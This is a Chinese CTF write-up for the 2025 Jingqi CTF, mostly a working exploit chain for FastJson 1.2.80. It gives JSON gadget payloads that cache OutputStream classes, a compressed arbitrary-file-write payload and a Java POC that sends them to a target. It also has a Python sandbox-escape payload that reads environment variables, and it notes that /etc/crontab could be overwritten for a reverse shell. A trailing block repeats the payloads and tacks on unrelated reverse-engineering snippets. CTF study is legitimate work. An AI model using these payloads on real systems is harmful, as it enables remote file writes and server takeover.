# 2025第三届京麒CTF挑战赛 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/249673.html
> ID: 249673

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 admin@chamd5.org(带上简历和想加入的小组)  

Web:

计算器

''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("env").read()')

删掉disable直接读环境变量

FastJ

本题WP由团队师傅提供。

分析

FastJson1.2.80最新利用

https://github.com/luelueking/CVE-2022-25845-In-Spring

通过Exception期望类可以缓存一些新类，上面能缓存InputStream。

问题任意文件读写需要common-io，需要找到openjdk11下的任意文件读写。

注意到题目采用JDK11，JDK11自带符号信息，可以调用任意构造函数。那么很可能还是利用OutputStream下的子类实现任意文件写。

第一步：缓存OutputStream

根据缓存InputStream的利用，找到缓存OutputStream的gadget。

UTF8JsonGenerator
JsonGenerator
JsonGenerationException
Exception

payload：

{"a":"{"@type":"java.lang.Exception","@type":"com.fasterxml.jackson.core.JsonGenerationException","g":{}}","b":{"$ref":"$.a.a"},"c":"{"@type":"com.fasterxml.jackson.core.JsonGenerator","@type":"com.fasterxml.jackson.core.json.UTF8JsonGenerator","out":{}}","d":{"$ref":"$.c.c"}}

第二步：任意文件写

1.2.80禁用了FileOutputStream，但题目实现了FilterFileOutputStream，结合rmb的利用可实现任意文件写。

{"@type":"java.io.OutputStream","@type":"sun.rmi.server.MarshalOutputStream","out":{"@type":"java.util.zip.InflaterOutputStream","out":{"@type":"com.app.FilterFileOutputStream","name":"/tmp/1234","prefix":"/"},"infl":{"input":{"array":"eJzT0jdU0IJC/aTMPP2kxOIMBd1kBXUII1PBTk1BPyW1TL8kuUDfQs/QxEzPyMAUiI30LSwsLRUM7NQM1QFanhCv","limit":${length}}},"bufLen":"100"},"protocolVersion":1}

array是一个压缩流，生成array方式如下：

String input = "123123123123";
ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
try (DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(byteArrayOutputStream)) {
    deflaterOutputStream.write(input.getBytes("UTF-8"));
}
String encoded = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
int leng = byteArrayOutputStream.toByteArray().length;
System.out.println(encoded);

limit设置为解压缩后byte的length。

第三步：定时任务

这步需要些脑洞。测试时发现远程可以在/root目录下写文件，判断权限为root。因此任意文件写到/etc/crontab，定时任务反弹shell即可。

POC

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.zip.DeflaterOutputStream;
import java.util.zip.InflaterInputStream;

publicclass POC {
    static String target = "http://localhost:
8080/";

    public static Object sendJson(String payload) {
        try {
            RestTemplate restTemplate = new RestTemplate();

            HttpHeaders httpHeaders = new HttpHeaders();
            httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

            LinkedMultiValueMap<Object, Object> map = new LinkedMultiValueMap<>();
            map.add("json", payload);

            HttpEntity<LinkedMultiValueMap<Object, Object>> request = new HttpEntity<>(map, httpHeaders);

            return restTemplate.postForObject(target, request, String.class);
        } catch (RestClientException e) {
            return"null";
        }
    }

    public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, InterruptedException {
        // 1. add inputStream to fastjson cache
        String payload1 = new String(Files.readAllBytes(Paths.get("payloads/step1.json")));
        sendJson(payload1);
        System.out.println(payload1);

        String path = "E://squirt1e.txt";

        String input = "nese123";
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        try (DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(byteArrayOutputStream)) {
            deflaterOutputStream.write(input.getBytes("UTF-8"));
        }

        String encoded = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        int leng = byteArrayOutputStream.toByteArray().length;

        String payload2 = new String(Files.readAllBytes(Paths.get("payloads/step3-.json")));
        payload2 = payload2.replace("{ABC}", encoded).replace(""{ABCD}"",String.valueOf(leng)).replace("{path}",path);
        sendJson(payload2);
        System.out.println(payload2);

    }

step1.json

{
  "a": "{    "@type": "java.lang.Exception",    "@type": "com.fasterxml.jackson.core.JsonGenerationException",    "g": {    }  }",
  "b": {
    "$ref": "$.a.a"
  },
  "c": "{  "@type": "com.fasterxml.jackson.core.JsonGenerator",  "@type": "com.fasterxml.jackson.core.json.UTF8JsonGenerator",  "out": {}}",
  "d": {
    "$ref": "$.c.c"
  }
}

step3-.json

{
  "@type": "java.io.OutputStream",
"@type": "sun.rmi.server.MarshalOutputStream",
"out": {
    "@type": "java.util.zip.InflaterOutputStream",
    "out": {
      "@type": "com.app.FilterFileOutputStream",
      "name": "{path}",
      "prefix": "/"
    },
    "infl": {
      "input": {
        "array": "{ABC}",
        "limit": "{ABCD}"
      }
    },
    "bufLen": "100"
  },
"protocolVersion": 1
}

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
UTF8JsonGenerator
JsonGenerator
JsonGenerationException
Exception
{"a":"{"@type":"java.lang.Exception","@type":"com.fasterxml.jackson.core.JsonGenerationException","g":{}}","b":{"$ref":"$.a.a"},"c":"{"@type":"com.fasterxml.jackson.core.JsonGenerator","@type":"com.fasterxml.jackson.core.json.UTF8JsonGenerator","out":{}}","d":{"$ref":"$.c.c"}}
{"@type":"java.io.OutputStream","@type":"sun.rmi.server.MarshalOutputStream","out":{"@type":"java.util.zip.InflaterOutputStream","out":{"@type":"com.app.FilterFileOutputStream","name":"/tmp/1234","prefix":"/"},"infl":{"input":{"array":"eJzT0jdU0IJC/aTMPP2kxOIMBd1kBXUII1PBTk1BPyW1TL8kuUDfQs/QxEzPyMAUiI30LSwsLRUM7NQM1QFanhCv","limit":${length}}},"bufLen":"100"},"protocolVersion":1}
String input = "123123123123";
ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
try (DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(byteArrayOutputStream)) {
    deflaterOutputStream.write(input.getBytes("UTF-8"));
}
String encoded = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
int leng = byteArrayOutputStream.toByteArray().length;
System.out.println(encoded);
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.zip.DeflaterOutputStream;
import java.util.zip.InflaterInputStream;

publicclass POC {
    static String target = "http://localhost:
8080/";

    public static Object sendJson(String payload) {
        try {
            RestTemplate restTemplate = new RestTemplate();

            HttpHeaders httpHeaders = new HttpHeaders();
            httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

            LinkedMultiValueMap<Object, Object> map = new LinkedMultiValueMap<>();
            map.add("json", payload);

            HttpEntity<LinkedMultiValueMap<Object, Object>> request = new HttpEntity<>(map, httpHeaders);

            return restTemplate.postForObject(target, request, String.class);
        } catch (RestClientException e) {
            return"null";
        }
    }

    public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, InterruptedException {
        // 1. add inputStream to fastjson cache
        String payload1 = new String(Files.readAllBytes(Paths.get("payloads/step1.json")));
        sendJson(payload1);
        System.out.println(payload1);

        String path = "E://squirt1e.txt";

        String input = "nese123";
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        try (DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(byteArrayOutputStream)) {
            deflaterOutputStream.write(input.getBytes("UTF-8"));
        }

        String encoded = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        int leng = byteArrayOutputStream.toByteArray().length;

        String payload2 = new String(Files.readAllBytes(Paths.get("payloads/step3-.json")));
        payload2 = payload2.replace("{ABC}", encoded).replace(""{ABCD}"",String.valueOf(leng)).replace("{path}",path);
        sendJson(payload2);
        System.out.println(payload2);

    }
{
  "a": "{    "@type": "java.lang.Exception",    "@type": "com.fasterxml.jackson.core.JsonGenerationException",    "g": {    }  }",
  "b": {
    "$ref": "$.a.a"
  },
  "c": "{  "@type": "com.fasterxml.jackson.core.JsonGenerator",  "@type": "com.fasterxml.jackson.core.json.UTF8JsonGenerator",  "out": {}}",
  "d": {
    "$ref": "$.c.c"
  }
}
{
  "@type": "java.io.OutputStream",
"@type": "sun.rmi.server.MarshalOutputStream",
"out": {
    "@type": "java.util.zip.InflaterOutputStream",
    "out": {
      "@type": "com.app.FilterFileOutputStream",
      "name": "{path}",
      "prefix": "/"
    },
    "infl": {
      "input": {
        "array": "{ABC}",
        "limit": "{ABCD}"
      }
    },
    "bufLen": "100"
  },
"protocolVersion": 1
}
bytes_array = [
  0x90, 0xFB, 0xF1, 0x17, 0x89, 0x89, 0x89, 0xF5, 0x86, 0x7D, 
  0xF5, 0xB6, 0x73, 0xB5
]
last_byte = bytes_array[-1]
target = 0xC3
xor_char = last_byte ^ target

# 检查是否在 0-9, a-z, _ 范围内
if (48 <= xor_char <= 57) or (97 <= xor_char <= 122) or (xor_char == 95):
    print(f"找到的异或字符: '{chr(xor_char)}'")
else:
    print("没有找到符合条件的异或字符。")
function getModuleBaseAddress(moduleName) {
    return Process.getModuleByName(moduleName).base;
}

function getFunctionAddress(moduleName, offset) {
    const base = getModuleBaseAddress(moduleName);
    return base.add(offset);
}

function hookSub2E668() {
    const moduleName = "libre0.so";
    const funcOffset = 0x184C;
    const funcAddress = getFunctionAddress(moduleName, funcOffset);
    
    console.log(`tea address: ${funcAddress}`);
    
    Interceptor.attach(funcAddress, {
        onEnter: function(args) {
            console.log(`tea called with:`);
            console.log(`  arg1 (X0): ${args[0]}`);
            console.log(`  arg2 (X2): ${args[2]}`);
            console.log(`  arg2 (X3): ${args[3]}`);
            //console.log(`  arg2 (X1): ${args[1]}`);

            console.log(hexdump(args[0]));
            console.log(hexdump(args[2]));
            console.log(hexdump(args[3]));
            //console.log(hexdump(args[1]));
        },
        onLeave: function(retval) {
            //打印xxtea加密之后的结果
            console.log(`tea returned: ${retval}`);
            console.log(hexdump(retval));
        }
    });
}

// 延迟执行以确保模块加载
setImmediate(hookSub2E668,2000);
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748305659-wxsync-2025-05-707a5ccd246209894ac7bf1d5c3b5816.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748305661-wxsync-2025-05-b8a3a370c1d188e39192d0726c712741.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748305664-wxsync-2025-05-5163da812fceb405d20e4260555c4b00.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748305666-wxsync-2025-05-5914d5622ca7fa223021b1be76242f79.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748305669-wxsync-2025-05-b68b21cca3f5673e3e50ae93edff4d54.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748305670-wxsync-2025-05-c9c011bff813ee812d972675b0a7271a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748305673-wxsync-2025-05-4a2db4d92bf07538ea259902843dfbf5.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748305675-wxsync-2025-05-fd541b79d29e0228e5f323aab5052672.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748305678-wxsync-2025-05-64d37f0a5bcc6c5b01ea3b122a45ce02.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/05/1748305680-wxsync-2025-05-a973e13beef4a9ba3cb8f756c7233f4a.png)